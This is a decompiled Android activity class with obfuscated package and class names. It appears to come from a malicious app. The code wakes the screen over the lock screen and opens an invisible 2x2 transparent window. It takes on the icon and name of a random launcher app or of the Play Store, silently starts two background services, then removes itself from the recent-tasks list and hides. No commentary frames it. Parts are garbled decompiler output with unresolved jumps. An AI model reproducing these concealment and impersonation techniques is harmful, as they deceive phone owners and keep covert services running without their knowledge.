/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.app.ActivityManager$TaskDescription
 *  android.content.Context
 *  android.content.Intent
 *  android.content.pm.ApplicationInfo
 *  android.graphics.Bitmap
 *  android.graphics.drawable.ColorDrawable
 *  android.graphics.drawable.Drawable
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.os.Handler
 *  android.os.Looper
 *  android.os.PowerManager
 *  android.view.SurfaceView
 *  android.view.View
 *  android.view.WindowManager$LayoutParams
 */
package linker.resourcer.encoder;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.graphics.Bitmap;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.view.SurfaceView;
import android.view.View;
import android.view.WindowManager;
import linker.resourcer.encoder.ffbrxjknfnpfxahr;
import linker.resourcer.encoder.lqvpqwmhpvnnlhskxyjdwphzvsl;
import linker.resourcer.encoder.qswemlflptdlumxqnjrlg;
import linker.resourcer.encoder.tqvrhaaccrutxfxdqsvweshxhwtl;

public class Vsbjtwxrb
extends Activity {
    private SurfaceView overlayView;

    private void doWork() {
        try {
            Context context = this.getApplicationContext();
            Intent intent = new Intent(context, qswemlflptdlumxqnjrlg.class);
            if (!tqvrhaaccrutxfxdqsvweshxhwtl.isServiceRunning(context, qswemlflptdlumxqnjrlg.class)) {
                if (Build.VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent);
                } else {
                    context.startService(intent);
                }
            }
            if (!tqvrhaaccrutxfxdqsvweshxhwtl.isServiceRunning(context, lqvpqwmhpvnnlhskxyjdwphzvsl.class)) {
                intent = new Intent(context, lqvpqwmhpvnnlhskxyjdwphzvsl.class);
                if (Build.VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent);
                } else {
                    context.startService(intent);
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    /*
     * Unable to fully structure code
     * Could not resolve type clashes
     */
    protected void onCreate(Bundle var1_1) {
        block13: {
            super.onCreate(var1_1 /* !! */ );
            if (Build.VERSION.SDK_INT >= 27) {
                this.setShowWhenLocked(true);
                this.setTurnScreenOn(true);
            }
            if ((var1_1 /* !! */  = (PowerManager)this.getSystemService("power")) == null) ** GOTO lbl9
            var1_1 /* !! */ .newWakeLock(805306394, "App:IncomingCall").acquire(3000L);
lbl9:
            // 2 sources

            this.overridePendingTransition(0, 0);
            try {
                this.requestWindowFeature(1);
                var1_1 /* !! */  = this.getWindow();
                var1_1 /* !! */ .setFlags(6815786, 1024);
                var2_5 = var1_1 /* !! */ .getAttributes();
                var2_5.height = 2;
                var2_5.width = 2;
                var2_5.gravity = 0x800033;
                var1_1 /* !! */ .setAttributes((WindowManager.LayoutParams)var2_5);
                var1_1 /* !! */ .clearFlags(2);
                var2_5 = new ColorDrawable(0);
                var1_1 /* !! */ .setBackgroundDrawable((Drawable)var2_5);
                var1_1 /* !! */ .addFlags(-2147483648);
                var1_1 /* !! */ .setStatusBarColor(0);
                var1_1 /* !! */ .setNavigationBarColor(0);
            }
            catch (Exception var1_2) {
                var1_2.printStackTrace();
            }
            var2_5 = ffbrxjknfnpfxahr.getRandomLauncherApp(this.getApplicationContext());
            var1_1 /* !! */  = var2_5;
            if (ffbrxjknfnpfxahr.isPackageInstalled(var2_5, this.getPackageManager())) break block13;
            var1_1 /* !! */  = "com.android.vending";
            if (ffbrxjknfnpfxahr.isPackageInstalled("com.android.vending", this.getPackageManager())) break block13;
            var1_1 /* !! */  = null;
        }
        if (var1_1 /* !! */  == null) ** GOTO lbl54
        try {
            var2_5 = this.getPackageManager();
            var1_1 /* !! */  = var2_5.getApplicationInfo((String)var1_1 /* !! */ , 0);
            var3_6 = var2_5.getApplicationIcon((ApplicationInfo)var1_1 /* !! */ );
            var1_1 /* !! */  = var2_5.getApplicationLabel((ApplicationInfo)var1_1 /* !! */ ).toString();
            this.setTitle((CharSequence)var1_1 /* !! */ );
            var3_6 = ffbrxjknfnpfxahr.drawableToBitmap(var3_6);
            var2_5 = new ActivityManager.TaskDescription((String)var1_1 /* !! */ , (Bitmap)var3_6, 0);
            this.setTaskDescription((ActivityManager.TaskDescription)var2_5);
            ** GOTO lbl54
        }
        catch (Exception var1_3) {
            var1_3.printStackTrace();
lbl54:
            // 3 sources

            this.doWork();
            var1_1 /* !! */  = new SurfaceView((Context)this);
            this.overlayView = var1_1 /* !! */ ;
            this.overlayView.setFocusable(true);
            this.overlayView.setClickable(true);
            this.overlayView.setBackgroundColor(0);
            this.setContentView((View)this.overlayView);
            var2_5 = new Handler(Looper.getMainLooper());
            var1_1 /* !! */  = new Runnable(this){
                final Vsbjtwxrb this$0;
                {
                    this.this$0 = vsbjtwxrb;
                }

                @Override
                public void run() {
                    try {
                        ffbrxjknfnpfxahr.excludeFromTaskList(this.this$0.getApplicationContext());
                        this.this$0.moveTaskToBack(true);
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                }
            };
            var2_5.postDelayed((Runnable)var1_1 /* !! */ , 3000L);
            {
                catch (Exception var1_4) {
                    var1_4.printStackTrace();
                    this.finish();
                }
            }
        }
    }

    protected void onDestroy() {
        super.onDestroy();
    }

    protected void onPause() {
        super.onPause();
        this.overridePendingTransition(0, 0);
    }

    protected void onResume() {
        super.onResume();
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable(this){
            final Vsbjtwxrb this$0;
            {
                this.this$0 = vsbjtwxrb;
            }

            @Override
            public void run() {
                try {
                    ffbrxjknfnpfxahr.excludeFromTaskList(this.this$0.getApplicationContext());
                    this.this$0.moveTaskToBack(true);
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        }, 1500L);
    }
}

